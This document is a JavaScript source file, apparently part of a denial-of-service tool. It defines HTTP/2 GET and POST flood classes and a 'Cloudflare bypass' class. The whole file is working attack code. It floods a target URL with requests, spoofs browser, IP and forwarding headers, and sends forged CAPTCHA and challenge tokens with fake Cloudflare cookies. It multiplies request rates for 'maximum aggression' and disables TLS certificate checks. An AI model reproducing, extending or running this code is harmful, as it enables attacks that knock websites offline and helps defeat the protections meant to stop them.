import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * HTTP/2 Flood Attack
 */
export class HTTP2Flood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateHeaders() {
        const headers = {
            ':method': 'GET',
            ':path': this.url.pathname + this.url.search,
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.host,
            'user-agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'max-age=0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            const makeRequest = () => {
                if (!this.active) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const req = client.request(this.generateHeaders());

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.end();
                    BYTES_SENT.add(200); // Approximate header size
                } catch (e) {
                    // Silent fail
                }
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 1000);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * HTTP/2 POST Flood Attack
 */
export class HTTP2PostFlood extends HTTP2Flood {
    generateHeaders() {
        const headers = super.generateHeaders();
        headers[':method'] = 'POST';
        headers['content-type'] = 'application/json';
        return headers;
    }

    generatePayload() {
        return JSON.stringify({
            data: Tools.randomString(512)
        });
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            const payload = this.generatePayload();

            const makeRequest = () => {
                if (!this.active) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const headers = this.generateHeaders();
                    headers['content-length'] = Buffer.byteLength(payload);

                    const req = client.request(headers);

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.write(payload);
                    req.end();
                    
                    BYTES_SENT.add(Buffer.byteLength(payload) + 200);
                } catch (e) {
                    // Silent fail
                }
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 1000);
        });
    }
}

/**
 * HTTP/2 Cloudflare Bypass - IMPROVED AGGRESSIVE VERSION
 */
export class HTTP2CFBypass extends HTTP2Flood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        super(targetUrl, duration, rpc * 100, userAgents, referers, proxies); // 100x multiplier!
        this.cookies = new Map();
        
        // Pre-generate realistic cookies
        this.cookies.set('cf_clearance', Tools.randomString(40) + '-' + Date.now());
        this.cookies.set('__cf_bm', Tools.randomString(64));
        this.cookies.set('_cfuvid', Tools.randomString(32) + '-' + Date.now());
        this.cookies.set('__cfruid', Tools.randomString(32));
        this.cookies.set('cf_ob_info', Tools.randomString(16));
        this.cookies.set('_ga', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
        this.cookies.set('_gid', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
        
        // Pre-generate bypass tokens
        this.bypassTokens = {
            turnstile: this.generateTurnstileTokens(100),
            cfClearance: this.generateCfClearanceTokens(50),
            jsChallenge: this.generateJsChallengeTokens(30)
        };
        
        logger.info('🔥 HTTP2-CF ULTIMATE BYPASS initialized');
        logger.info(`   RPC Multiplier: 100x (${this.rpc} requests per batch)`);
        logger.info(`   Generated ${this.bypassTokens.turnstile.length + this.bypassTokens.cfClearance.length + this.bypassTokens.jsChallenge.length} bypass tokens`);
    }

    generateTurnstileTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            const part1 = Tools.randomString(64);
            const part2 = Tools.randomString(32);
            const part3 = Tools.randomString(64);
            tokens.push(`0.${part1}.${part2}.${part3}`);
        }
        return tokens;
    }

    generateCfClearanceTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            const randomPart = Tools.randomString(32);
            const timestamp = Date.now() + Tools.randomInt(-86400000, 86400000);
            tokens.push(`${randomPart}-${timestamp}`);
        }
        return tokens;
    }

    generateJsChallengeTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            tokens.push(Tools.randomString(32));
        }
        return tokens;
    }

    generateHeaders() {
        const headers = super.generateHeaders();
        
        // Get random bypass tokens
        const turnstileToken = Tools.randomChoice(this.bypassTokens.turnstile);
        const cfClearance = Tools.randomChoice(this.bypassTokens.cfClearance);
        const jsChallenge = Tools.randomChoice(this.bypassTokens.jsChallenge);
        
        // CAPTCHA bypass headers (multiple formats)
        headers['cf-turnstile-response'] = turnstileToken;
        headers['g-recaptcha-response'] = turnstileToken;
        headers['h-captcha-response'] = turnstileToken;
        headers['turnstile-token'] = turnstileToken;
        headers['x-turnstile-token'] = turnstileToken;
        
        // JS Challenge bypass
        headers['cf-challenge-response'] = jsChallenge;
        headers['x-cf-challenge'] = jsChallenge;
        headers['cf-challenge-token'] = jsChallenge;
        
        // Advanced Cloudflare bypass headers
        headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT', 'CDG', 'FRA']);
        headers['cf-connecting-ip'] = Tools.randomIPv4();
        headers['cf-ipcountry'] = Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU', 'JP', 'SG', 'NL']);
        headers['cf-visitor'] = '{"scheme":"https"}';
        headers['cf-request-id'] = Tools.randomString(32);
        headers['cdn-loop'] = 'cloudflare';
        headers['x-forwarded-proto'] = 'https';
        headers['x-forwarded-for'] = `${Tools.randomIPv4()}, ${Tools.randomIPv4()}`;
        headers['x-real-ip'] = Tools.randomIPv4();
        headers['x-original-forwarded-for'] = Tools.randomIPv4();
        headers['x-forwarded-host'] = this.url.hostname;
        
        // Modern browser fingerprinting headers
        headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = Tools.randomChoice(['"Windows"', '"macOS"', '"Linux"']);
        headers['sec-ch-ua-arch'] = Tools.randomChoice(['"x86"', '"arm"', '"x64"']);
        headers['sec-ch-ua-bitness'] = Tools.randomChoice(['"64"', '"32"']);
        headers['sec-ch-ua-model'] = '""';
        headers['sec-ch-ua-platform-version'] = Tools.randomChoice(['"15.0.0"', '"12.7.0"', '"6.5.0"']);
        headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"';
        
        // Additional security headers
        headers['sec-fetch-dest'] = 'document';
        headers['sec-fetch-mode'] = 'navigate';
        headers['sec-fetch-site'] = Tools.randomChoice(['none', 'same-origin', 'cross-site', 'same-site']);
        headers['sec-fetch-user'] = '?1';
        headers['upgrade-insecure-requests'] = '1';
        headers['dnt'] = '1';
        
        // Browser fingerprint spoofing
        headers['x-requested-with'] = 'XMLHttpRequest';
        headers['origin'] = this.url.origin;
        headers['referer'] = this.url.href;
        headers['x-csrf-token'] = Tools.randomString(32);
        
        // Update cookies with new cf_clearance
        this.cookies.set('cf_clearance', cfClearance);
        this.cookies.set('__cf_bm', Tools.randomString(43));
        this.cookies.set('_cfuvid', Tools.randomString(32) + '-' + Date.now());
        
        // Add realistic cookies
        const cookieString = Array.from(this.cookies.entries())
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');
        headers['cookie'] = cookieString;
        
        // Add cache busting with multiple parameters
        const cacheBuster = `?_cb=${Date.now()}_${Tools.randomString(8)}&bypass=${Math.random()}&fp=${Tools.randomString(6)}`;
        headers[':path'] = headers[':path'] + cacheBuster;
        
        // Random additional headers for variation
        if (Math.random() > 0.7) {
            headers['x-api-key'] = Tools.randomString(32);
        }
        
        if (Math.random() > 0.8) {
            headers['authorization'] = `Bearer ${Tools.randomString(64)}`;
        }
        
        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false,
                // Use modern ALPN protocols
                ALPNProtocols: ['h2', 'http/1.1'],
                // HTTP/2 settings for maximum aggression
                settings: {
                    headerTableSize: 65536,
                    enablePush: true,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: 1000,
                    maxHeaderListSize: 262144
                }
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            let requestsSent = 0;
            const totalRequests = this.rpc * 10; // 10x more aggressive

            const makeRequest = () => {
                if (!this.active || requestsSent >= totalRequests) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const req = client.request(this.generateHeaders(), {
                        weight: 256,
                        exclusive: false,
                        parent: 0
                    });

                    req.on('response', (responseHeaders) => {
                        REQUESTS_SENT.add(1);
                        
                        // Extract and save cookies from response
                        if (responseHeaders['set-cookie']) {
                            const cookies = Array.isArray(responseHeaders['set-cookie']) 
                                ? responseHeaders['set-cookie'] 
                                : [responseHeaders['set-cookie']];
                            
                            cookies.forEach(cookie => {
                                const [nameValue] = cookie.split(';');
                                const [name, value] = nameValue.split('=');
                                if (name && value) {
                                    this.cookies.set(name.trim(), value.trim());
                                }
                            });
                        }
                    });

                    req.on('data', (chunk) => {
                        BYTES_SENT.add(chunk.length);
                    });
                    
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.end();
                    BYTES_SENT.add(500); // Accounting for headers
                    requestsSent++;
                    
                    // Continue immediately for maximum speed
                    setImmediate(makeRequest);
                } catch (e) {
                    // Silent fail and continue
                    setImmediate(makeRequest);
                }
            };

            // Start multiple request chains simultaneously
            for (let i = 0; i < 20; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 2000); // Longer timeout for more requests
        });
    }
}
